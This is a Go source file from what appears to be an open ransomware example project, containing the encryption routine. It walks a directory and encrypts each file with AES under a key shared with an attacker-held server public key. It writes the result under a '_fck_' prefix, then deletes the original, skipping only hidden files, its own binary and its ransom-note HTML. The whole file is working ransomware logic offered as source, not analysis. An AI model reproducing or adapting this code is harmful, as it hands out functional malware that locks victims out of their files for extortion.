/*
Ransomware example in Golang
Copyright (C) 2017 Gustavo Henrique

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>
*/
package cryptography

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"encoding/hex"
	"io"
	"math/big"
	"os"
	"path/filepath"
	"strings"
)

type CipherMode int

const (
	RSW_PREFIX   string     = "_fck_"
	RSW_HTML     string     = "rsw_welcome.html"
	ENCRYPT_MODE CipherMode = iota
	DECRYPT_MODE
)

var (
	iv           = []byte{34, 35, 35, 57, 68, 4, 35, 36, 7, 8, 35, 23, 35, 86, 35, 23}
	serverPubKey PubKey
)

func EncryptDir(dirPath string, config ServerConfig) error {
	serverPubKey = config.PubKey
	return filepath.Walk(dirPath, WalkFuncDecorator(encryptFile))
}

func getServerEcdsaPubKey(serverPubKey PubKey) *ecdsa.PublicKey {
	xBytes, _ := hex.DecodeString(serverPubKey.X)
	x := new(big.Int).SetBytes(xBytes)
	yBytes, _ := hex.DecodeString(serverPubKey.Y)
	y := new(big.Int).SetBytes(yBytes)
	pubkeyCurve := elliptic.P256()
	pubKey := new(ecdsa.PublicKey)
	pubKey.X = x
	pubKey.Y = y
	pubKey.Curve = pubkeyCurve
	return pubKey
}

func createHeader(pubKey *ecdsa.PublicKey, fi os.FileInfo) string {
	header := ToHex(pubKey.X)
	header += "."
	header += ToHex(pubKey.Y)
	header += "."

	paddingLen := 16 - (len(header) % 16)

	if paddingLen > 0 {
		header += strings.Repeat("F", paddingLen)
	}
	return header
}

func pad(in []byte) []byte {
	padding := 16 - (len(in) % 16)
	if padding == 0 {
		padding = 16
	}
	for i := 0; i < padding; i++ {
		in = append(in, byte(padding))
	}
	return in
}

func isSymlink(fi os.FileInfo) bool {
	return (fi.Mode() & os.ModeSymlink) == os.ModeSymlink
}

func encryptFile(path string, fi os.FileInfo, err error) (e error) {
	if fi.IsDir() || isSymlink(fi) {
		return nil
	}

	if strings.HasPrefix(fi.Name(), ".") || strings.HasPrefix(fi.Name(), RSW_PREFIX) || strings.HasPrefix(fi.Name(), RSW_HTML) {
		return nil
	}
	if strings.Contains(os.Args[0], fi.Name()) {
		curFileInfo, err := os.Stat(os.Args[0])
		if err != nil {
			return err
		}
		if os.SameFile(fi, curFileInfo) {
			return nil
		}

	}

	srcFile, err := os.Open(path)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	baseDir := filepath.Dir(path)
	outFilePath := filepath.Join(baseDir, RSW_PREFIX+fi.Name())

	outFile, err := os.Create(outFilePath)
	if err != nil {
		return err
	}

	defer outFile.Close()

	clientPrivKey, _ := GenerateECDSAPrivateKey()
	cSymK, _ := GenSharedKey(clientPrivKey, getServerEcdsaPubKey(serverPubKey))
	aesBlockMode, err := GetCipherBlockMode(cSymK, ENCRYPT_MODE)
	if err != nil {
		return err
	}

	outFile.WriteString(createHeader(&clientPrivKey.PublicKey, fi))

	buffer := make([]byte, 1024)
	for {
		n, err := srcFile.Read(buffer)
		if err != nil && err != io.EOF {
			return err
		}
		if n == 0 {
			break
		}

		if n < 1024 {
			buffer = pad(buffer[:n])
			n = len(buffer)
		}

		cCiphered := make([]byte, len(buffer))
		aesBlockMode.CryptBlocks(cCiphered, buffer[:n])
		_, err = outFile.Write(cCiphered)

		if err != nil {
			return err
		}
	}

	srcFile.Close()
	outFile.Close()

	err = CopyFileMetadata(fi, outFilePath)
	if err != nil {
		return err
	}

	return os.Remove(path)
}
